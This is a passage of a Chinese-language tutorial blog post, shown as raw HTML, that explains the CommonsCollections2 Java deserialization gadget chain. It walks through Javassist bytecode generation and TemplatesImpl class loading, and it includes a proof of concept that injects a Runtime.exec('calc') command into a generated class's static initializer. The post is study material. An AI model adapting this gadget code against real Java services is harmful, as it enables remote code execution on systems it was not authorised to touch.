class="hljs-number">2500</span> <span class="hljs-number">0200</span> <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">09</span>b<span class="hljs-number">2</span> <span class="hljs-number">0002</span> <span class="hljs-number">1203</span>  ..%.............<br><span class="hljs-attribute">00000190</span>: b<span class="hljs-number">600</span> <span class="hljs-number">04</span>b<span class="hljs-number">1</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>a <span class="hljs-number">0000</span> <span class="hljs-number">000</span>a <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001a0</span>: <span class="hljs-number">0000</span> <span class="hljs-number">0005</span> <span class="hljs-number">0008</span> <span class="hljs-number">0006</span> <span class="hljs-number">0001</span> <span class="hljs-number">000</span>d <span class="hljs-number">0000</span> <span class="hljs-number">0002</span>  ................<br><span class="hljs-attribute">000001b0</span>: <span class="hljs-number">000</span>e                                     ..<br></code></pre></td></tr></table></figure><p>其他详见 class 文件解析，class 文件属性解析，java 虚拟机指令集</p><p>正是有了这些基础，出现了 Java 字节码库允许我们通过字节码库的 API 动态创建修改 Java 类、方法、变量等操作，例如：一种通用的 Java 字节码操作和分析框架<code>ASM</code>，可以直接以二进制形式修改现有的类或者生成类文件；另一种是<code>Javassist</code>，它相比于<code>ASM</code>更简便，我们不用关注 Java 底层的字节码和栈操作，学会如何使用其 API 就可以实现字节码的编辑</p><p>和反射差不多用，参考：<a href="https://javasec.org/javase/JavaByteCode/Javassist.html">javasec</a> <a href="https://www.w3cschool.cn/article/35230124.html">w3cschool</a> <a href="https://github.com/IndustriousSnail/javassist-learn">javaassist-translate</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, IOException, NotFoundException </span>&#123;<br>        ClassPool classPool = ClassPool.getDefault();<br>        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;CommonsCollections.CC2.Evil&quot;</span>);<br>        CtMethod Mmain = CtMethod.make(<br>                <span class="hljs-string">&quot;public static void main(String[] args) &#123;System.out.println(\&quot;main method\&quot;);&#125;&quot;</span>, ctClass<br>        );<br>        ctClass.addMethod(Mmain);<br>        ctClass.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;evil code\&quot;);&quot;</span>);<br>        CtMethod MSysinfo = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;Sysinfo&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        MSysinfo.setModifiers(<span class="hljs-number">1</span>);<br>        MSysinfo.setBody(<span class="hljs-string">&quot;System.out.println(System.getProperty(\&quot;os.name\&quot;));&quot;</span>);<br>        ctClass.addMethod(MSysinfo);<br>        ctClass.writeFile(<span class="hljs-string">&quot;D:\\program\\java\\moonlight\\src\\main\\java&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] var0)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;main method&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;evil code&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Sysinfo</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>既然可以通过<code>Javassist</code>写入静态代码，那么只要类实例被创建就会执行；生成的 class 文件如何利用呢，读取为 byte 数组，然后通过<strong>继承 ClassLoader，重写 findClass 方法</strong>或者直接<strong>反射调用 defineClass 方法</strong>(不想遵循双亲委派可以<strong>重写 loadClass</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">byte</span>[] bytes = ctClass.toBytecode();<br><br><span class="hljs-comment">//1</span><br><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> defineClass(类名, 类字节码<span class="hljs-keyword">byte</span>数组, <span class="hljs-number">0</span>, <span class="hljs-keyword">byte</span>数组长度);<br>    &#125;<br><br><span class="hljs-comment">//2</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>Method defineClassMeth = clz.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>defineClassMeth.setAccessible(<span class="hljs-keyword">true</span>);<br>Class ac = (Class) defineClassMeth.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;myjavasec.Moonlight&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length);<br>ac.newInstance();<br></code></pre></td></tr></table></figure><p>但因为<code>ClassLoader.defineClass</code>是<code>protected</code>的，我们无法通过外部访问，不能直接使用反射调用</p><p>然而，总有一些类的<code>defineClass</code>方法是被底层的其他类使用到了的，这就是<code>TemplatesImpl</code>的内部类<code>TransletClassLoader</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;<br><br>     TransletClassLoader(ClassLoader parent) &#123;<br>         <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;<br>        <span class="hljs-keyword">super</span>(parent);<br>        _loadedExternalExtensionFunctions = mapEF;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        Class&lt;?&gt; ret = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-comment">// The _loadedExternalExtensionFunctions will be empty when the</span><br>        <span class="hljs-comment">// SecurityManager is not set and the FSP is turned off</span><br>        <span class="hljs-keyword">if</span> (_loadedExternalExtensionFunctions != <span class="hljs-keyword">null</span>) &#123;<br>            ret = _loadedExternalExtensionFunctions.get(name);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-keyword">null</span>) &#123;<br>            ret = <span class="hljs-keyword">super</span>.loadClass(name);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ret;<br>     &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function">Class <span class="hljs-title">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-keyword">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。Java 中默认情况下，如果一个 方法没有显式声明作用域，其作用域为 default。所以也就是说这里的 defineClass 由其父类的 protected 类型变成了一个 default 类型的方法，可以被类外部调用。</p><p>往前看调用结构为：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineClass<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span><span class="hljs-module"><span class="hljs-identifier">TransletClassLoader</span>.</span></span>defineTransletClasses<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletClasses()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br>        #TrAXFilter.<span class="hljs-constructor">TrAXFilter(Templates)</span> # CC3则用到了TrAXFilter类<br></code></pre></td></tr></table></figure><p>而<code>TemplatesImpl.getOutputProperties</code>和<code>TemplatesImpl.newTransformer</code>都是 public，可以被外部调用</p><p>而<code>getOutputProperties</code>方法符合<code>JavaBean</code>的<code>getter</code>定义</p><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>我们现在要调用读入的字节码数组<code>static</code>代码块，并且初始化，ysoserial 用的是<code>TemplatesImpl</code></p><p>在<code>newTransformer</code>方法调用了<code>getTransletInstance</code>，当<code>_class</code>数组不为空时</p><ul><li>调用<code>defineTransletClasses</code>，通过<code>loader.defineClass</code>读取了字节码数组</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>    _class[i] = loader.defineClass(_bytecodes[i]);<br>    <span class="hljs-keyword">final</span> Class superClass = _class[i].getSuperclass();<br><br>    <span class="hljs-comment">// Check if this is the main class</span><br>    <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>        _transletIndex = i;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        _auxClasses.put(_class[i].getName(), _class[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>调用<code>newInstance</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();<br></code></pre></td></tr></table></figure><p>这两步成功执行字节码的 static 代码块</p><p>暂时直接调用<code>TemplatesImpl.newTransformer</code>，编写 poc 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC2;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//生成类</span><br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        <span class="hljs-comment">//写入static代码</span><br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-comment">//继承AbstractTranslet类</span><br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-comment">//转换为字节码数组，相当于输出了字节码文件了</span><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        <span class="hljs-comment">//实例化TemplatesImpl，反射修改四个属性值</span><br>        TemplatesImpl templatesimpl = TemplatesImpl.class.newInstance();<br>        <span class="hljs-comment">//TemplatesImpl templatesimpl = new TemplatesImpl();//也可以通过构造方法实例化</span><br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templatesimpl.newTransformer();<br>        <span class="hljs-comment">//templatesimpl.getOutputProperties();//也可以这样触发</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里通过文章构造出来了初步 poc，存疑：</p><ul><li>什么是池路径</li></ul><blockquote><p><strong>ClassPool.getDefault</strong> 默认会搜索 JVM 下面相同路径的类，并返回 ClassPool。但是，如果一个程序运行在 Web 应用服务器上，像 JBoss 和 Tomcat 那种，<strong>ClassPool</strong>对象可能就找不到用户指定的类了，因为 web 应用服务使用了多个系统类加载器。这种情况下，需要给<strong>ClassPool</strong>注册一个额外的 Class 路径。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(<span class="hljs-keyword">this</span>.getClass()));<br></code></pre></td></tr></table></figure><p>这句代码注册了一个类的类路径，这个类是<strong>this</strong>指向的那个类。你可以使用任意<strong>Class</strong>代替**this.getClass()**。</p><p>你也可以注册一个文件夹作为类路径。例如，下面这段代码增添可以了文件夹**/usr/local/javalib**到搜索路径中：</p><p>ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(“/usr/local/javalib”);</p><p>搜索路径不仅可以是目录，甚至可以是 URL：</p><p>ClassPool pool = ClassPool.getDefault();<br>ClassPath cp = new URLClassPath(“<a href="http://www.javassist.org&quot;/">www.javassist.org&quot;</a>, 80, “/java/“, “org.javassist.”);<br>pool.insertClassPath(cp);</p><p>该代码增添了<strong><a href="http://www.javassist.org/java/">http://www.javassist.org:80/java/</a></strong> 到类文件搜索路径下。该 URL 仅仅搜索<strong>org.javassist.</strong> 包下的 class 文件。例如，要加载<strong>org.javassist.test.Main</strong> 这个类，javassist 会从这个地址下获取该类文件：</p><p><a href="http://www.javassist.org/java/org/javassist/test/Main.class">http://www.javassist.org:80/java/org/javassist/test/Main.class</a></p><p>此外，你也可以直接给<strong>ClassPool</strong>对象一个 byte 数组，然后用这个数组构建<strong>CtClass</strong>对象。要这样做，用<strong>ByteArrayClassPath</strong>, 例如：</p><p>ClassPool cp = ClassPool.getDefault();<br>byte[] b = a byte array;<br>String name = class name;<br>cp.insertClassPath(new ByteArrayClassPath(name, b));<br>CtClass cc = cp.get(name);</p><p>获得的<strong>CtClass</strong>对象表示一个由<strong>b</strong>指定的类文件定义的类。如果调用<strong>get()</strong> ，<strong>ClassPool</strong>会从<strong>ByteArrayClassPath</strong>中读取一个 Class 文件，指定的 Class 的名字就是上面的<strong>name</strong>变量。</p><p>如果你不知道这个类的全限定名，你可以使用<strong>ClassPool</strong>中的<strong>makeClass()</strong> :</p><p>ClassPool cp = ClassPool.getDefault();<br>InputStream ins = an input stream for reading a class file;<br>CtClass cc = cp.makeClass(ins);</p><p><strong>makeClass()</strong> 返回一个通过输入流构建出来的<strong>CtClass</strong>。你可以使用<strong>makeClass()</strong> 给<strong>ClassPool</strong> 对象提供一个比较急的 Class 文件。如果搜索路径包含了一个很大的 jar 包，这可以提高性能。因为<strong>ClassPool</strong>对象会一个一个找，它可能会重复搜索整个 jar 包中的每一个 class 文件。<strong>makeClass()</strong> 可以优化这个搜索。<strong>makeClass()<strong>构造出来的类会保存在</strong>ClassPool</strong>对象中，你下次再用的时候，不会再次读 Class 文件</p></blockquote><h4 id="AbstractTranslet"><a href="#AbstractTranslet" class="headerlink" title="AbstractTranslet"></a>AbstractTranslet</h4><ul><li>为什么设置父类为<code>AbstractTranslet</code></li></ul><p><code>TemplatesImpl</code>中对加载的字节码是有一定要求的：这个字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</p><p>在<code>TemplatesImpl.defineTransletClasses</code>方法中，<code>_transletIndex</code>在循环体判断字节码是否继承自<code>AbstractTranslet</code>并赋值 i；否则没有赋值则默认-1；而在循环体下面的判断，如果小于零会抛出异常；因此需要设置其父类为<code>AbstractTranslet</code></p><ul><li>在使用 javaassit+TemplatesImpl，为什么传入池路径是<code>AbstractTranslet.class</code></li></ul><p>在使用<code>TemplatesImpl</code>时，插入池路径的值为<code>AbstractTranslet.class</code>，是因为<code>TemplatesImpl</code>继承了<code>AbstractTranslet</code>类，并且在执行<code>transform()</code>方法时需要访问<code>AbstractTranslet</code>类的定义。具体来说，<code>TemplatesImpl</code>中的<code>transform()</code>方法会调用<code>AbstractTranslet</code>类中的<code>transform()</code>方法来执行 XSLT 转换。因此，在构造<code>TemplatesImpl</code>实例时，需要插入<code>AbstractTranslet</code>类的定义到类池路径中，以便在执行<code>transform()</code>方法时能够找到<code>AbstractTranslet</code>类的定义。<strong>ClassPool.getDefault</strong> 默认会搜索 JVM 下面相同路径的类，并返回 ClassPool。但是，如果一个程序运行在 Web 应用服务器上，像 JBoss 和 Tomcat 那种，<strong>ClassPool</strong>对象可能就找不到用户指定的类了，因为 web 应用服务使用了多个系统类加载器。这种情况下，需要给<strong>ClassPool</strong>注册一个额外的 Class 路径。虽然<code>TemplatesImpl</code>只是继承了<code>AbstractTranslet</code>类，但是<code>AbstractTranslet</code>类本身也包含了一些用于执行 XSLT 转换的基本方法。因此，在执行 XSLT 转换时，<code>AbstractTranslet</code>类的定义也是必需的。因此为了确保不出错，添加一条额外的<code>AbstractTranslet</code>的搜索路径，确保 Javaassit 生成<code>TemplatesImpl</code>字节码不出错</p><ul><li>设置的四个属性值</li></ul><p>进入<code>defineTransletClasses</code>方法之前有两个判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure><p>所以<code>_name</code>需要赋值，<code>_class</code>赋空</p><p>剩下两个属性在<code>defineTransletClasses</code>方法里，<code>_bytecodes</code>为空会抛出异常，将其赋值为目标字节码<code>new byte[][]&#123;classbytes&#125;</code>(注意定义为二维数组，需要转换)；<code>_tfactory</code>是<code>TransformerFactoryImpl</code>类定义置空，因此赋值为<code>new TransformerFactoryImpl()</code></p><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><blockquote><p><strong>PriorityQueue 优先级队列</strong></p><p><code>PriorityQueue</code> 优先级队列是<strong>基于优先级堆</strong>的一种特殊队列。在我们熟知的队列基础上添加比较器（Comparator）功能，每次插入或者删除元素时，会按照比较器设定的规则进行元素排序等操作</p><p>（1）不定义比较器，使用默认比较器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;();<br>        <span class="hljs-comment">// 输出原始队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// 逐个插入优先级队列</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// 逐个输出优先级队列</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg"></p><p>可以看出，使用默认的比较器，每次弹出的元素是队列中最小的。</p><p>（2）定义一个比较器，从大到小输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-comment">//        PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;();</span><br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> 